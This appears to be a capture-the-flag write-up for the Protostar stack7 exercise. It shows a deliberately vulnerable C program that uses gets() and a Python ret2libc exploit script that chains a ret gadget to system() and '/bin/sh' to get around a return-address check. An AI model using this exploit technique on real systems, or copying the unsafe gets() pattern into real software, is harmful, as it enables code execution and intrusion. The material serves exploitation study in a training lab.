Source Code:

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

This is similar to stack6 but this time we can not use any address that starts with 0xb, in the previous challenge the restriction was we could not use any address which starts with 0xbf thus eliminating the standard jumping on the stack and executing shellcode so we had used ret2libc which didn't have address starting with 0xbf

We will again use ret2libc but before that we will add the address of ret instruction of the getpath function. Since the address of system() function starts with 0xb this is why we need to use the ret instruction first to bypass the check.

A retn instruction simply pops the value at the top of the stack and then jumps to that address.

exploit.py

```python
import struct

offset=80
padding="A"*offset
ret=struct.pack("I",0x08048544)

system=struct.pack("I",0xb7ecffb0)
exit="\x90"*4
binsh=struct.pack("I",0xb7e97000 + 0x11f3bf)


buffer = padding + ret + system + exit + binsh 
print buffer
```

![[Pasted image 20210805123806.png]]